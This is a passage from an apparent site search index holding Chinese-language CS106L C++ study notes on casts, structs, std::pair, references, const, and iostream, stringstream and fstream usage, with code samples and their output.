== nullptr;\n}\n\n// C. \u7406\u7531\u540c\u4e0a\uff0c\u4f46\u662f\u6b64\u4f8b\u4e0d\u8fd4\u56de\u7a7a\u6307\u9488\nstruct U { virtual void foo() {} };\nstruct V : public U {};\nstruct W : public U {};\nint main()\n{\n    U* p = new V;\n    W* q = dynamic_cast&lt;W*&gt;(p);\n    return q == nullptr;\n}\n\n// D. static_cast \u4e0d\u5141\u8bb8\u7528\u4e8e\u8f6c\u6362\u4e24\u4e2a\u4e0d\u76f8\u5173\u7684\u6307\u9488\uff08\u9664\u4e86 void*\uff09\nstruct U {};\nstruct V : public U {};\nstruct W {};\nint main()\n{\n    U* p = new V;\n    W* q = static_cast&lt;W*&gt;(p);\n    return q == nullptr;\n}\n</code></pre> <p><code>dynamic_cast&lt;target&gt;(expression)</code> \u5728\u8fd0\u884c\u65f6\u4f1a\u68c0\u67e5\u57fa\u7c7b\u6307\u9488 <code>expression</code> \u6307\u5411\u7684\u5bf9\u8c61\u662f\u5426\u662f <code>target</code> \u6216\u5176\u5b50\u7c7b\uff0c\u5426\u5219\u53ea\u4f1a\u8fd4\u56de <code>nullptr</code>\u3002\u5176\u6700\u5e38\u89c1\u7684\u7528\u9014\u662f\u591a\u6001\u573a\u666f\u4e2d\u5224\u65ad\u4e00\u4e2a\u57fa\u7c7b\u6307\u9488/\u5f15\u7528\u6307\u5411\u54ea\u4e2a\u6d3e\u751f\u7c7b\u578b\uff1a</p> <pre><code>Base* pb = new Derived();\nif (dynamic_cast&lt;Derived*&gt;(pb))\n    cout &lt;&lt; \"OK\" &lt;&lt; endl;\nelse\n    cout &lt;&lt; \"NO\" &lt;&lt; endl;\n</code></pre> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c<code>expression</code> \u7684\u52a8\u6001\u7c7b\u578b\u5fc5\u987b\u4e3a <code>target</code> \u6216\u5176\u6d3e\u751f\u7c7b\u3002</p>"},{"location":"Accumulation/CS106L/C%2B%2B/#structs","title":"Structs","text":"<p>A struct is a a group of named variables, each with their own type, that allows programmers to bundle different types together.</p> <pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstruct Student{\n    string name;\n    string state;\n    int age;\n};\n\nvoid printStudentInfo(Student s){\n    cout &lt;&lt; s.name &lt;&lt; \" from \" &lt;&lt; s.state;\n    cout &lt;&lt; \" (\" &lt;&lt; s.age &lt;&lt; \")\" &lt;&lt; endl; \n}\n\nint main(void)\n{\n    Student s = {\"Nimisora\", \"CS\", 17};\n    printStudentInfo(s);\n}\n</code></pre> <p>\u4e0e C \u8bed\u8a00\u7565\u6709\u4e0d\u540c\u7684\u662f\uff0cC++\u7684\u7ed3\u6784\u53d8\u91cf\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u7ed3\u6784\u4f53\u540d\u58f0\u660e\u5b9a\u4e49\uff0c\u800cC\u9700\u8981\u52a0\u4e0a <code>struct</code> \u3002</p> <p>\u4f17\u6240\u5468\u77e5\u7ed3\u6784\u4f53\u4e5f\u5e38\u7528\u4f5c\u51fd\u6570\u8fd4\u56de\u591a\u4e2a\u7ed3\u679c\u7684\u4e2d\u4ecb\uff0c\u4e0d\u8fc7C++\u7684STL\u4e2d\u4e5f\u5b58\u5728\u5185\u7f6e\u7684\u7ed3\u6784\u4f53\u53ef\u7528\u6765\u5b8c\u6210\u8fd9\u4e00\u64cd\u4f5c\u3002\u5982\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u4efb\u610f\u4e24\u79cd\u7c7b\u578b\u7684\u6a21\u677f\u7ed3\u6784\u4f53 <code>std::pair</code> :</p> <pre><code>struct pair{\n    fill_in_type first;\n    fill_in_type second;\n};\n</code></pre> <p>\u914d\u5408\u51fd\u6570 <code>std::make_pair</code> \u53ef\u4ee5\u5f88\u65b9\u4fbf\u8fbe\u6210\u4f20\u9012\u4e24\u4e2a\u8fd4\u56de\u503c\uff1a</p> <pre><code>std::pair&lt;bool, Student&gt; lookupStudent(string name)\n{\n    Student blank;\n    if (notFound(name)) return std::make_pair(false, blank);\n    Student result = getStudentWithName(name);\n    return std::make_pair(true, result);\n}\n\nstd::pair&lt;bool, Student&gt; output = lookupStudent(\"Inuisana\");\n// auto output = lookupStudent(\"Inuisana\")  // More Neat!\n</code></pre> <p>\u5b9e\u9645\u4e0a\u4f7f\u7528 Uniform Initialization \u5373\u53ef\uff1a</p> <pre><code>#include &lt;cmath&gt;    // for sqrt\n#include &lt;iostream&gt; // to print\n#include &lt;utility&gt;  // for pairs\n\nstd::pair&lt;bool, std::pair&lt;int, int&gt;&gt; solveQuadratic(int a, int b, int c) {\n    auto discriminant = b * b - 4 * a * c;\n    if (discriminant &lt; 0)\n        return {false, {0, 0}};\n    int root1 = (-b + sqrt(discriminant)) / (2 * a);\n    int root2 = (-b - sqrt(discriminant)) / (2 * a);\n    return {true, {root1, root2}};\n}\n\nint main() {\n    auto result = solveQuadratic(1, -3, 2);\n    if (result.first)\n        std::cout &lt;&lt; \"Root 1: \" &lt;&lt; result.second.first &lt;&lt; std::endl &lt;&lt; \"Root 2: \" &lt;&lt; result.second.second &lt;&lt; std::endl;\n    else\n        std::cout &lt;&lt; \"No real roots\" &lt;&lt; std::endl;\n}\n</code></pre> <p>std::pair - cppreference.com from <code>#include &lt;utility&gt;</code></p>"},{"location":"Accumulation/CS106L/C%2B%2B/#references","title":"References","text":"<p>\u4f7f\u7528 <code>&amp;</code> \u6765\u8bbe\u7f6e\u4e00\u4e2a\u53d8\u91cf\u7684\u522b\u540d\uff1a</p> <pre><code>int num = 5;\nint&amp; ref = num;\nref = 10;\ncout &lt;&lt; num &lt;&lt; endl; // Output: 10\n</code></pre> <p>Type Restrictions</p> <ul> <li>\u5f15\u7528\u4e0d\u80fd\u7ed1\u5b9a\u5f15\u7528</li> <li>\u4e0d\u5141\u8bb8\u5f15\u7528 arrays</li> <li>\u4e0d\u5141\u8bb8\u5c06\u5f15\u7528\u4f5c\u4e3a\u6307\u9488\uff0c\u4f46\u662f\u5141\u8bb8\u5f15\u7528\u7ed1\u5b9a\u6307\u9488\uff0c\u5373<ul> <li><code>int&amp;* p = ...;</code> \u662f\u975e\u6cd5\u7684</li> <li><code>void f(int*&amp; p);</code> \u662f\u5408\u6cd5\u7684</li> </ul> </li> <li>\u4e0d\u5141\u8bb8\u91cd\u65b0\u7ed1\u5b9a</li> </ul> <p>\u7531\u4e8e Reference \u672c\u8d28\u662f\u548c\u6e90\u53d8\u91cf\u6307\u5411\u540c\u4e00\u5757\u5806\u6808\u5730\u5740\uff0c\u56e0\u6b64\u4fee\u6539\u5b83\u4e5f\u4f1a\u5bf9\u6e90\u53d8\u91cf\u7684\u503c\u4e00\u540c\u4fee\u6539\u3002\u5229\u7528\u8fd9\u4e2a\u6027\u8d28\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u522b\u540d\u4f5c\u4e3a\u5f62\u53c2\uff0c\u4ee5\u5b9e\u73b0\u76f4\u63a5\u5bf9\u522b\u7684\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u4fee\u6539\uff1a</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;math.h&gt;\n\nvoid square(int&amp; n) {\n    n = std::pow(n, 2);\n}\n\nint main(void) {\n    int num = 2;\n    square(num);\n    std::cout &lt;&lt; num &lt;&lt; std::endl; // Output: 4\n}\n</code></pre> <p>\u4f7f\u7528\u522b\u540d\u4f5c\u4e3a\u5f62\u53c2</p> <p>\u4f7f\u7528\u522b\u540d\u4f5c\u4e3a\u5f62\u53c2\u610f\u5473\u7740\u544a\u8bc9\u7f16\u8bd1\u5668\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u53c2\u6570\u65f6\u662f\u76f4\u63a5\u4f7f\u7528\u53c2\u6570\u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\uff0c\u800c\u4e0d\u662f\u5c06\u5176\u503c\u590d\u5236\u8fdb\u4e00\u4e2a\u4e34\u65f6\u5730\u5740\u3002</p> <p>\u975e <code>const</code> \u5f15\u7528\u7684\u53ea\u80fd\u7ed1\u5b9a\u5230\u5de6\u503c lvalue</p> <pre><code>void func(int&amp;);\nfunc(i * 3); // Error!\n</code></pre> <p>lvalue \u6307\u6709\u540d\u5b57\u3001\u53ef\u5bfb\u5740\u7684\u53d8\u91cf\u3002\u60f3\u8981\u8ba9\u4e0a\u8ff0\u51fd\u6570\u7f16\u8bd1\u901a\u8fc7\uff0c\u53ef\u9009\u7528\u4e2d\u95f4\u53d8\u91cf\u6765\u4f20\u9012 <code>i*3</code>\uff0c\u6216\u8005\u6539\u4e3a <code>func(const int&amp;);</code> \u6765\u7ed1\u5b9a\u53f3\u503c</p> <p>\u90a3\u4e48\u6ce8\u610f\u89c2\u5bdf\uff0c\u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4fee\u6539 <code>nums</code> \u4e2d\u7684\u503c\u5417\uff1f</p> <pre><code>void shift(std::vector&lt;std::pair&lt;int, int&gt;&gt; &amp;nums)\n{\n    for (auto [num1, num2] : nums){\n        num1++;\n        num2++;\n    }\n}\n</code></pre> <p>\u7b54\u6848\u662f\u4e0d\u4f1a\u7684\uff0c\u56e0\u4e3a <code>for</code> \u5faa\u73af\u7684\u53d6\u503c\u4e5f\u662f\u4ec5\u590d\u5236\u5176\u503c\uff0c\u800c\u4e0d\u662f\u5728\u540c\u4e00\u5185\u5b58\u5730\u5740\u4e0a\u8fdb\u884c\u64cd\u4f5c\uff0c\u5c06\u5176\u4fee\u6539\u5982\u4e0b\uff0c\u5219\u53ef\u4ee5\u8fbe\u5230\u9884\u671f\u6548\u679c\uff1a</p> <pre><code>void shift(std::vector&lt;std::pair&lt;int, int&gt;&gt; &amp;nums)\n{\n    for (auto&amp; [num1, num2] : nums){\n        num1++;\n        num2++;\n    }\n}\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4e0d\u4f7f\u7528\u5f15\u7528\u65f6\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5bf9\u8c61\uff08\u5728\u672c\u4f8b\u4e2d\u4e3a\u4e00\u4e2aSTL\u5bb9\u5668 <code>pair</code>\uff09\uff0c\u8fd9\u79cd\u62f7\u8d1d\u904d\u5386\u5c06\u5e26\u6765\u5f88\u5927\u7684\u989d\u5916\u5f00\u9500\u3002\u800c\u4f7f\u7528\u5f15\u7528\u5219\u51cf\u5c11\u4e86\u4e0d\u5fc5\u8981\u7684\u5f00\u9500\u3002</p> <p>\u5982\u679c\u5faa\u73af\u4e2d\u4e0d\u9700\u8981\u5bf9\u5143\u7d20\u8fdb\u884c\u4fee\u6539\uff0c\u8bf7\u52a0\u4e0a <code>const</code></p> <p>C++11 \u5f00\u59cb\u5f15\u5165\u4e86\u53f3\u503c\u5f15\u7528 <code>T&amp;&amp;</code> \uff0c\u5b83\u53ea\u80fd\u7ed1\u5b9a\u5230\u53f3\u503c\u4e0a\uff0c\u5141\u8bb8\u6211\u4eec\u6682\u65f6\u4fdd\u7559\u8fd9\u4e9b\u4e34\u65f6\u5bf9\u8c61\u7684\u8d44\u6e90\uff0c\u5e76\u4e14\u4e0d\u7528\u4ed8\u51fa\u548c\u62f7\u8d1d\u4e00\u6837\u5927\u7684\u5f00\u9500\uff1a</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nvoid printString(const std::string&amp; s) {\n    std::cout &lt;&lt; \"Lvalue reference: \" &lt;&lt; s &lt;&lt; \"\\n\";\n}\n\nvoid printString(std::string&amp;&amp; s) {\n    std::cout &lt;&lt; \"Rvalue reference (moved): \" &lt;&lt; s &lt;&lt; \"\\n\";\n}\n\nint main() {\n    std::string name = \"Alice\";\n\n    printString(name);           // \u8c03\u7528 const lvalue reference \u7248\u672c\n    printString(std::string(\"Bob\")); // \u8c03\u7528 rvalue reference \u7248\u672c\n    printString(std::move(name));    // \u5f3a\u5236\u628a name \u8f6c\u6210\u53f3\u503c \u2192 \u8c03\u7528 rvalue \u7248\u672c\n}\n\n/*Output:\nLvalue reference: Alice\nRvalue reference (moved): Bob\nRvalue reference (moved): Alice\n*/\n</code></pre> \u8868\u8fbe\u5f0f \u7c7b\u578b \u7ed1\u5b9a\u65b9\u5f0f <code>name</code> \u5de6\u503c\uff08\u53d8\u91cf\uff09 \u7ed1\u5b9a\u5230 <code>const std::string&amp;</code> <code>std::string(\"Bob\")</code> \u53f3\u503c\uff08\u4e34\u65f6\u5bf9\u8c61\uff09 \u7ed1\u5b9a\u5230 <code>std::string&amp;&amp;</code> <code>std::move(name)</code> \u5f3a\u5236\u53f3\u503c \u7ed1\u5b9a\u5230 <code>std::string&amp;&amp;</code>"},{"location":"Accumulation/CS106L/C%2B%2B/#const","title":"Const","text":"<p><code>const</code> is a qualifier for objects that declares they cannot be modified.</p> <p>From cppreference</p> <p>\u589e\u52a0\u4fee\u9970\u8bcd <code>const</code> \u7684\u53d8\u91cf\u76f8\u5f53\u4e8e\u5e38\u91cf\uff0c\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u8fd9\u4e5f\u5305\u62ec reference\u3002</p> <p>\u5e76\u4e14\uff0c\u4e5f\u4e0d\u5141\u8bb8\u7528\u975e\u5e38\u91cfreference\u6765\u5f15\u7528\u5e38\u91cf\uff1a</p> <pre><code>const std::vector&lt;int&gt; const_vec{1, 2, 3}; // a const vector\nstd::vector&lt;int&gt;&amp; bad_ref{ const_vec };  // bad reference\n</code></pre> <p>\u7f16\u8bd1\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4f1a\u53d1\u751f\u7f16\u8bd1\u8b66\u544a\uff1a</p> <pre><code>int x;\nstd::cin &gt;&gt; x;\nconst int size = x;\ndouble classAverage[size]; // error\nclassAverage[x - 1] = x;\nstd::cout &lt;&lt; classAverage[x-1] &lt;&lt; std::endl;\n</code></pre> <pre><code>\u279c  code g++ main.cpp -std=c++17 -pedantic -Wall\nmain.cpp: In function \u2018int main()\u2019:\nmain.cpp:20:16: warning: ISO C++ forbids variable length array \u2018classAverage\u2019 [-Wvla]\n   20 |         double classAverage[size]; // error\n      |                ^~~~~~~~~~~~\n</code></pre> <p>\u8fd9\u5b9e\u9645\u662f\u56e0\u4e3a C++ \u4e0d\u5141\u8bb8\u4f7f\u7528\u8fd0\u884c\u65f6\u53d8\u91cf\u58f0\u660e\u6570\u7ec4\u7684\u5927\u5c0f\uff0c\u5373\u4fbf\u8fd9\u4e2a\u53d8\u91cf\u88ab\u58f0\u660e\u4e3a <code>const</code>\uff1b\u5373 C++ \u8981\u6c42\u6570\u7ec4\u5927\u5c0f\u5728\u7f16\u8bd1\u65f6\u5c31\u80fd\u786e\u5b9a\u3002</p> <p>\u5728\u66f4\u597d\u7684\u5b9e\u8df5\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 <code>new</code> \u6765\u52a8\u6001\u5206\u914d\u6570\u7ec4\uff0c\u6216\u8005\u4f7f\u7528\u6807\u51c6 STL\uff1a</p> <pre><code>// Method 1\ndouble* classAverage = new double[x]; // \u8bb0\u5f97\u8981 delete\n\n// Method 2\nstd::vector&lt;double&gt; classAverage(x);\n</code></pre> <p>\u5b9e\u9645\u7f16\u8bd1\u65f6\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u81ea\u52a8\u5bf9 C++ \u505a\u4e86\u975e\u6807\u51c6\u6269\u5c55\uff0c\u4ece\u800c\u652f\u6301 VLA \u7279\u6027</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u9700\u8981\u6ce8\u610f\u6307\u9488 <code>*</code> \u548c <code>const</code> \u4e4b\u95f4\u7684\u4f4d\u7f6e\u5173\u7cfb\uff1a</p> <pre><code>int a[] = {53,54,55};\n\nint * const p = a; // p is const\n*p = 20; // OK\np++;     // ERROR\n\nconst int *p = a;  // (*p) is const\n*p = 20; // ERROR!\np++;     // OK\n\nint const *p = a;  // (*p) is const\n// \u4e0e\u4e0a\u4e00\u4e2a\u5b8c\u5168\u7b49\u4ef7\n</code></pre> <p>\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53f3\u503c\uff0c\u901a\u5e38\u81ea\u5e26 <code>const</code> \u5c5e\u6027\uff0c\u4f46\u662f\u7f16\u8bd1\u5668\u5141\u8bb8\u5c06\u5b57\u7b26\u4e32\u5e38\u91cf\u8d4b\u503c\u7ed9\u4e00\u4e2a\u975e <code>const</code> \u6307\u9488\uff1a</p> <pre><code>char* s = \"Hello, world!\"; // \u53ef\u4ee5\u79fb\u52a8\uff0c\u4e0d\u80fd\u4fee\u6539\uff0c= const char*\nchar s[] = \"Hello, world!\";// \u4e0d\u80fd\u79fb\u52a8\uff0c\u53ef\u4ee5\u4fee\u6539\uff0c= *const char\n</code></pre>"},{"location":"Accumulation/CS106L/C%2B%2B/#streams","title":"Streams","text":"<p>Recommended Reading: https://web.stanford.edu/class/archive/cs/cs106l/cs106l.1204/lectures/types/types.pdf</p> <p>Streams is a general input/output abstraction for C++.</p> <ul> <li>Input Streams <ul> <li>A way to read data from a source</li> <li>\u4ece <code>std::istream</code> \u4e2d\u7ee7\u627f</li> </ul> </li> <li>Output Streams<ul> <li>A way to write data to destination</li> <li>\u4ece <code>std::ostream</code> \u4e2d\u7ee7\u627f</li> </ul> </li> </ul> <p>C++\u7684IO\u5e93\u5206\u4e3a\u4e09\u4e2a\u5934\u6587\u4ef6\uff1a</p> \u5934\u6587\u4ef6 \u7c7b\u578b <code>iostream</code> istream \u4ece\u6d41\u8bfb\u53d6\u6570\u636eostream \u5411\u6d41\u8f93\u51fa\u6570\u636eiostream \u8bfb\u5199\u6d41 <code>fstream</code> ifstream \u4ece\u6587\u4ef6\u8bfb\u53d6\u6570\u636eofstream \u5411\u6587\u4ef6\u8f93\u51fa\u6570\u636efstream \u8bfb\u5199\u6587\u4ef6 <code>sstream</code> istringstream \u4ecestring\u8bfb\u53d6\u6570\u636eostringstream \u5411string\u8f93\u51fa\u6570\u636estringstream \u8bfb\u5199string"},{"location":"Accumulation/CS106L/C%2B%2B/#iostream","title":"iostream","text":"<ul> <li><code>cin</code>: Standard Input</li> <li><code>cout</code>: Standard Output</li> <li><code>cerr</code>: unbuffered error output</li> <li><code>clog</code>: buffered error output</li> </ul> <p>\u4e00\u4e2a\u57fa\u672c\u7684 <code>iostream</code> \u5e94\u7528\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;iostream&gt;\n\nint main(){\n    double pi;\n    std::cin &gt;&gt; pi;            // console in\n    std::cout &lt;&lt; pi &lt;&lt; \"\\n\";   // console out\n    return 0;\n}\n</code></pre> <p><code>std::endl</code> \u548c <code>\\n</code> \u7684\u533a\u522b</p> <p><code>std::endl</code> \u4e0d\u4ec5\u544a\u8bc9stream\u8981\u7ed3\u675f\u8fd9\u4e00\u884c\uff0c\u8fd8\u8981\u6c42\u5176\u7acb\u5373\u5c06buffer\u4e2d\u7684\u6570\u636e\u8f93\u51fa\u663e\u793a\uff0c\u5373 flush \u3002\u4f46\u662f flush \u64cd\u4f5c\u5f00\u9500\u8f83\u5927\uff0c\u6240\u4ee5\u5f53\u9700\u8981\u9891\u7e41\u8f93\u51fa\u65f6\uff0c\u4e0d\u59a8\u5c1d\u8bd5\u4e00\u4e0b\u4f7f\u7528 <code>\\n</code>\uff0c\u5e76\u4e14C++\u4f1a\u81ea\u5df1\u5224\u65ad\u4ec0\u4e48\u65f6\u5019\u8981\u8fdb\u884c flush\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b\u7a0b\u5e8f\uff1a</p> <pre><code>#include &lt;iostream&gt;\n\nint main(void) {\n    double d1, d2;\n    std::string name;\n    std::cin &gt;&gt; d1;\n    std::cin &gt;&gt; name;\n    std::cin &gt;&gt; d2;\n\n    std::cout &lt;&lt; \"d1: \" &lt;&lt; d1 &lt;&lt; \"\\n\" \n        &lt;&lt; \"d2: \" &lt;&lt; d2 &lt;&lt; \"\\n\" \n        &lt;&lt; \"name: \" &lt;&lt; name &lt;&lt; \"\\n\";\n}\n</code></pre> <p>\u7531\u4e8e\u82f1\u6587\u59d3\u540d\u4e4b\u95f4\u5b58\u5728\u7a7a\u683c\uff0c\u5047\u5b9a\u6211\u4eec\u7684\u8f93\u5165\u4e3a <code>3.14 Miu Amaha 1.11</code> \uff0c\u8fd9\u5c06\u4f1a\u4ea7\u751f\u610f\u6599\u4e4b\u5916\u7684\u8f93\u51fa\uff1a</p> <pre><code>d1: 3.14\nd2: 0\nname: Miu\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a <code>std::cin &gt;&gt; name</code> \u662f\u4ee5\u7a7a\u683c\u548c\u6362\u884c\u7b26\u4e3a\u5206\u9694\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5728\u8bfb\u53d6\u65f6\u4e0d\u4ee5\u7a7a\u683c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u5206\u9694\uff0c\u6211\u4eec\u5e94\u4f7f\u7528 <code>std::getline()</code> \u51fd\u6570\uff1a</p> <pre><code>#include &lt;iostream&gt;\n\nint main(void) {\n    double d1, d2;\n    std::string name;\n    std::cin &gt;&gt; d1;\n    std::getline(std::cin, name);\n    std::cin &gt;&gt; d2;\n\n    std::cout &lt;&lt; \"d1: \" &lt;&lt; d1 &lt;&lt; \"\\n\" \n        &lt;&lt; \"d2: \" &lt;&lt; d2 &lt;&lt; \"\\n\" \n        &lt;&lt; \"name: \" &lt;&lt; name &lt;&lt; \"\\n\";\n}\n/*\nInput:\n3.14\nAmaha miu\n1.11\n----------\nOutput:\nd1: 3.14\nd2: 0\nname:\n\n*/\n</code></pre> <p>\u4f46\u662f\u7b54\u6848\u4ecd\u7136\u4e0d\u7b26\u5408\u9884\u671f\uff0c\u8fd9\u662f\u56e0\u4e3a <code>getline</code> \u8bc6\u522b\u4e86\u4e0a\u4e00\u884c\u7684\u6362\u884c\u7b26\uff0c\u4f7f\u5f97 <code>name</code> \u7684\u5185\u5bb9\u4ec5\u4e3a <code>\\n</code> \u3002\u56e0\u6b64\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u901a\u5e38\u8fde\u7eed\u4f7f\u7528\u4e24\u6b21 <code>getline</code> \u6765\u89e3\u51b3\uff1a</p> <pre><code>#include &lt;iostream&gt;\n\nint main(void) {\n    double d1, d2;\n    std::string name;\n    std::cin &gt;&gt; d1;\n    std::getline(std::cin, name);\n    std::getline(std::cin, name);\n    std::cin &gt;&gt; d2;\n\n    std::cout &lt;&lt; \"d1: \" &lt;&lt; d1 &lt;&lt; \"\\n\" \n        &lt;&lt; \"d2: \" &lt;&lt; d2 &lt;&lt; \"\\n\" \n        &lt;&lt; \"name: \" &lt;&lt; name &lt;&lt; \"\\n\";\n}\n/*\nInput:\n3.14\nAmaha miu\n1.11\n----------\nOutput:\nd1: 3.14\nd2: 1.11\nname: Amaha miu\n*/\n</code></pre> <p>\u5b9e\u9645\u4e0a\u5c06 <code>getline</code> \u548c <code>std::cin</code> \u7ec4\u5408\u4f7f\u7528\u662f\u4e0d\u88ab\u63a8\u8350\u7684</p>"},{"location":"Accumulation/CS106L/C%2B%2B/#sstream","title":"sstream","text":"<p><code>stringstream</code> \u5b9a\u4e49\u4e8e\u5934\u6587\u4ef6 <code>&lt;sstream&gt;</code> \uff0c\u5b83\u5176\u5b9e\u662f\u4e00\u4e2a\u522b\u540d\uff0c\u5177\u4f53\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>typedef basic_stringstream&lt;char&gt; stringstream;\n</code></pre> <p><code>sstream</code> \u5141\u8bb8\u4f60\u5c06\u5b57\u7b26\u4e32\u4f5c\u4e3a\u8f93\u5165/\u8f93\u51fa\u6d41\u6765\u4f7f\u7528\uff0c\u4e5f\u5e38\u7528\u4e8e\u5904\u7406\u5b57\u7b26\u4e32\u3002</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;sstream&gt;\n\nint main(){\n    std::string initial_quote = \"I hate python, but I love C++\";\n\n    // create a stringstream object with initial value\n    std::stringstream ss;\n    ss &lt;&lt; initial_quote;\n    // or you can try:\n    // std::stringstream ss(initial_quote);\n\n    // data destination\n    std::string first, second, third, quote;\n\n    ss &gt;&gt; first &gt;&gt; second &gt;&gt; third &gt;&gt; quote;\n    std::cout &lt;&lt; first &lt;&lt; \" \" &lt;&lt; second &lt;&lt; \" \" &lt;&lt; third &lt;&lt; \" \" &lt;&lt; quote &lt;&lt; std::endl;\n}\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a <code>stringstream</code> \u7c7b\u5bf9\u8c61\uff0c\u5e76\u4f7f\u7528 <code>&gt;&gt;</code> \u548c <code>&lt;&lt;</code> \u5c06\u5b57\u7b26\u4e32\u6309\u7a7a\u683c\u5206\u9694\u5e76\u8f93\u51fa\u3002</p> <p>\u6700\u540e\u80fd\u591f\u770b\u5230\u8f93\u51fa <code>I hate python, but</code> \uff0c\u53ef\u662f\u5982\u679c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u4e0d\u6309\u7a7a\u683c\u5206\u9694\uff0c\u4e00\u76f4\u8bfb\u53d6\u5230\u6700\u540e\uff0c\u8be5\u600e\u4e48\u529e\uff1f</p> <pre><code>istream&amp; getline(istream&amp; is, string&amp; str, char delim = '\\n');\n</code></pre> <p><code>getline</code> \u51fd\u6570\u53ef\u4ee5\u8bfb\u53d6\u4e00\u4e2a input stream <code>is</code> \u76f4\u5230\u9047\u89c1\u5b57\u7b26 <code>delim</code> \uff0c\u5e76\u628a\u7ed3\u679c\u5b58\u50a8\u5728\u5b57\u7b26\u4e32 <code>str</code> \u4e2d\u3002\u5176\u4e2d <code>delim</code> \u9ed8\u8ba4\u662f <code>\\n</code> \u3002</p> <p>\u8ba9\u6211\u4eec\u7b80\u5355\u4fee\u6539\u4e00\u4e0b\u4e0a\u8ff0\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5c06 <code>but I love C++</code> \u5b58\u50a8\u8fdb\u5b57\u7b26\u4e32\u5bf9\u8c61 <code>quote</code> \u4e2d\u4e86\uff1a</p> <pre><code>    ss &gt;&gt; first &gt;&gt; second &gt;&gt; third;\n    std::getline(ss, quote);\n    std::cout &lt;&lt; first &lt;&lt; \" \" &lt;&lt; second &lt;&lt; \" \" &lt;&lt; third &lt;&lt; \" \" &lt;&lt; quote &lt;&lt; std::endl;\n/*Output:\nI hate python,  but I love C++\n---------------------------------\nIf we use: std::getline(ss, quote, 'C');\nThen the output: I hate python,  but I love\n*/\n</code></pre> <p>\u4f7f\u7528 <code>ss.str()</code> \uff0c\u53ef\u4ee5\u5c06\u5bf9\u8c61 <code>ss</code> \u5185\u90e8\u5b57\u7b26\u4e32\u8f93\u51fa</p>"},{"location":"Accumulation/CS106L/C%2B%2B/#fstream","title":"fstream","text":"<pre><code>#include &lt;fstream&gt;\n\nint main(){\n    // if `output.txt` not exit, the program will touch it.\n    std::ofstream ofs(\"output.txt\");\n    if (ofs.is_open())\n        ofs &lt;&lt; \"Hello, CS106L\" &lt;&lt; \"\\n\";\n    ofs.close();\n\n    // bad try\n    ofs &lt;&lt; \"this will not get written\";\n\n    // ios::app: \u8868\u793a\u6dfb\u52a0\u6570\u636e\uff0c\u800c\u4e0d\u662f\u8986\u76d6\u6570\u636e\n    ofs.open(\"output.txt\",  std::ios::app);\n    ofs &lt;&lt; \"It's open again!\";\n    return 0;\n}\n\n/*output.txt:\nHello, CS106L\nIt's open again!\n*/\n</code></pre> <pre><code>int inputFileStreamExample() {\n    std::ifstream ifs(\"output.txt\");\n    if (ifs.is_open()) {\n        std::string line;\n        std::getline(ifs, line);\n        std::cout &lt;&lt; \"Read from the file: \" &lt;&lt; line &lt;&lt; \"\\n\"; \n    }\n    if (ifs.is_open()) {\n        std::string lin2;\n        std::getline(ifs, lin2);\n        std::cout &lt;&lt; \"Read from the file: \" &lt;&lt; lin2 &lt;&lt; \"\\n\";\n    }\n    return 0;\n}\n\n/*Output:\nRead from the file: Hello, CS106L\nRead from the file: It's open again!\n*/\n</code></pre> <p><code>ofs.close</code></p> <p>\u5728\u5b9e\u9645\u5c1d\u8bd5\u4e2d\uff0c\u6211\u7684\u7b2c\u4e8c\u884c\u6570\u636e\u4e00\u76f4\u8bfb\u4e0d\u51fa\u6765\u3002\u7ecf\u8fc7\u5c1d\u8bd5\u53d1\u73b0\u662f\u4e0a\u9762\u90a3\u4e2a\u8f93\u51fa\u6570\u636e\u5230\u6587\u4ef6\u7684\u7a0b\u5e8f\u5728\u8f93\u5165\u7b2c\u4e8c\u884c\u6570\u636e\u540e\u5e76\u6ca1\u6709\u5173\u95ed\u6587\u4ef6\uff0c\u6240\u4ee5\u5bfc\u81f4\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u8be5\u6587\u4ef6\u53ea\u6709\u4e00\u884c\u6570\u636e\u3002\u4f46\u662f\u7a0b\u5e8f\u8fd0\u884c\u5b8c\u540e\u80fd\u591f\u53d1\u73b0\u7b2c\u4e8c\u884c\u6570\u636e\u8fd8\u662f\u5199\u5165\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u7a0b\u5e8f\u4f1a\u5728\u7ed3\u675f\u524d\u5173\u95ed\u6240\u6709\u6253\u5f00\u7684\u6587\u4ef6\uff0c\u800c\u5173\u95ed\u65f6\u624d\u5c06\u6570\u636e\u5199\u5165\u3002</p>"},{"location":"Accumulation/CS106L/C%2B%2B/#define-extractor","title":"Define 